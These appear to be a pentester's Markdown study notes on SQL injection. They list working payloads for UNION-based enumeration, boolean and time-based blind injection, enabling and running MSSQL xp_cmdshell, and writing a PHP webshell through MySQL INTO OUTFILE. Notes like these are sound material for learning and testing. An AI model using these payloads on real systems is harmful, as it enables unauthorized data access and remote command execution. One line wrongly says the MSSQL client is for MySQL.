# SQL Injection
```
SQL vulnerabilities typically allow the attacker to extend the original application query to include database tables that would normally be inaccessible.
```
### MySQL
- [MySQL Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- `MySQL` is one of the most commonly deployed database variants, along with `MariaDB`, an open-source fork of MySQL.
- `mysql` is a command-line tool that can be used to interact with MySQL instances.
### MSSQL
- [MSSQL Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- `MSSQL` is a database management system that natively integrates into the Windows ecosystem.
- A Windows built-in command-line tool named `SQLCMD` allows SQL queries to be run through the Windows command prompt or even remotely from another machine.
- `impacket-mssqlclient` is a command-line tool that can be used to interact with MySQL instances on Kali Linux.
	```bash 
	# where `-windows-auth` keyword forces NTLM authentication (as opposed to Kerberos).
	impacket-mssqlclient [Username]:[Password]@[IP Address] -windows-auth
	```
### Manual SQL Exploitation
```bash
# provides visibility on payload, and also adds some protection against any kind of whitespace truncation
name' OR 1=1 -- //
```
- <mark>In-Band SQLi</mark>:
	```
	SQL injection is considered `in-band` when the vulnerable application provides the result of the query along with the application-returned value. 
	```
	- <mark>Error-based</mark>: use the information disclosed in error messages to gain insights into the internal workings of the system, which can then be used to craft more targeted and effective attacks.
		- `' or 1=1 in (select @@version) -- //
			- Use subquery to display extra information
	- <mark>UNION-based</mark>: Whenever we are dealing with in-band SQL injections, we should also test for `UNION-based SQL` injections.
		- For `UNION` SQLi attacks to work, we first need to satisfy two conditions:
			1. Injected `UNION` query has to include the same number of columns as the original query.
			2. Data types need to be compatible between each column.
		- Before crafting any attack strategy, we need to know the exact number of columns present in the target table.
			- `' ORDER BY 1 -- //`: 
				- orders the results by a specific column and will fail whenever the selected column does not exist.
				- One can discover the actual column number by increasing the column value by one each time.
		- After finding out the column number of the target table. One can craft the corresponding payload.
			- `' UNION SELECT null, null, database(), user(), @@version  -- //`:
				- column 1 is typically reserved for the ID field consisting of an _integer_ data type. Hence, one needs to place enumerating functions to the right-most place, avoiding any type mismatches.
- <mark>Blind</mark>
	```
	scenarios in which "database responses" are never returned and behavior is inferred using either boolean or time-based logic.
	```
	- <mark>Boolean-based</mark>: cause the web application to return different results based on the truth value of a certain condition.
		- `offsec' AND 1=1 -- //`:
			- `1=1`will always be `TRUE`, the application will return the values only if the user is present in the database.
	- <mark>Time-based</mark>: infer the query results by instructing the database to wait for a specified amount of time.
		- `offsec' AND IF (1=1, sleep(3),'false') -- //`:
			- The `IF` statement will execute and wait for 3 seconds only when the user is present due to early termination of  `AND`.
### Manual/Automated Code Execution
```
Depending on the operating system, service privileges, and filesystem permissions, SQL injection vulnerabilities can be used to read and write files on the underlying operating system.
```
- <mark>MSSQL Manual Code Execution with xp_cmdshell</mark>: 
	- Requires Database Administration Privileges.
	- `xp_cmdshell` function takes a string and passes it to a command shell for execution. The function is disabled by default but can enable by the following commands:
		```bash
		EXECUTE sp_configure "show advanced options", 1;
		RECONFIGURE;
		EXECUTE sp_configure "xp_cmdshell", 1;
		RECONFIGURE;
		EXECUTE xp_cmdshell "whoami";
		```
- <mark>MySQL Manual Code Execution with ` SELECT INTO_OUTFILE`</mark>: 
	- File location must be writable to the OS user running the database software.
	- `' UNION SELECT "<?php system($_REQUEST['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
-  <mark>Postgresql Authenticated Code Execution</mark>:
	- `CVE-2019–9193`